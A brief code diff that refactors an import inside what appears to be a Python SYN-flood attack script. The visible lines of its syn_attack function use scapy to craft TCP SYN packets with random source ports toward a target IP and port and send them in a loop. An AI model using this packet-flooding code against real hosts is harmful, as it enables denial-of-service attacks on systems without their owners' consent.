@@ -1,7 +1,7 @@
 from scapy.all import *
 import random
 from time import sleep
-from utils import get_tcpdump
+from . import utils as utilities
 
 
 
@@ -17,7 +17,7 @@ def syn_attack():
 			a=IP(dst=targetIP)/TCP(flags="S",  sport=RandShort(),  
 			dport=port)
 			print("SYN Attack is starting.")
-			tcp = get_tcpdump(targetIP)
+			tcp = utilities.get_tcpdump(targetIP)
 			sleep(2)
 			send(a,  verbose=0) # Sends the Packet
 			ctr += 1
